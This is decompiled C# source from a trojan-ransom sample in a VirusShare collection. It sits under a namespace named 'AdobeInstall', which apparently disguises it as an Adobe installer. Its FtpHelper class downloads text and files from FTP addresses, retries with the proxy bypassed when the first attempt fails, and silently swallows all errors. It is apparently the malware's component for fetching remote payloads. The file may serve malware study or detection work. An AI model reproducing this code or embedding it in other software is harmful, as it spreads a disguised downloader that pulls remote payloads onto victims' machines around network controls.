// Decompiled with JetBrains decompiler
// Type: AdobeInstall.FtpHelper
// Assembly: AdobeInstall, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DFDDE196-DEB9-44F6-B5C0-C51F3E45F14A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00023-msil\Trojan-Ransom.MSIL.Proxy.a-74e82ea2869b3858b3c14d5a38f1a8d06d6eda8469762f33236a05ee0f65fa07.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Net;

namespace AdobeInstall
{
  public class FtpHelper
  {
    public static string DownloadText(string uri)
    {
      string Left = FtpHelper.DownloadText(uri, false);
      if (Operators.CompareString(Left, "", false) == 0)
        Left = FtpHelper.DownloadText(uri, true);
      return Left;
    }

    public static string DownloadText(string uri, bool noproxy)
    {
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(uri);
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        string end = streamReader.ReadToEnd();
        streamReader.Close();
        response.Close();
        return end;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "";
    }

    public static bool DownloadFile(string url, string aFile)
    {
      bool flag = FtpHelper.DownloadFile(url, aFile, false);
      if (!flag)
        flag = FtpHelper.DownloadFile(url, aFile, true);
      return flag;
    }

    public static bool DownloadFile(string url, string aFile, bool noproxy)
    {
      bool flag;
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(url);
        ftpWebRequest.KeepAlive = false;
        ftpWebRequest.UseBinary = true;
        ftpWebRequest.Method = "RETR";
        if (noproxy)
          ftpWebRequest.Proxy = (IWebProxy) null;
        using (FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse())
        {
          using (Stream responseStream = response.GetResponseStream())
          {
            using (FileStream fileStream = new FileStream(aFile, FileMode.Create))
            {
              byte[] numArray = new byte[2048];
              int count;
              do
              {
                count = responseStream.Read(numArray, 0, numArray.Length);
                fileStream.Write(numArray, 0, count);
              }
              while (count != 0);
              responseStream.Close();
              fileStream.Flush();
              fileStream.Close();
            }
            responseStream.Close();
          }
        }
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static bool IsInternet() => true;
  }
}
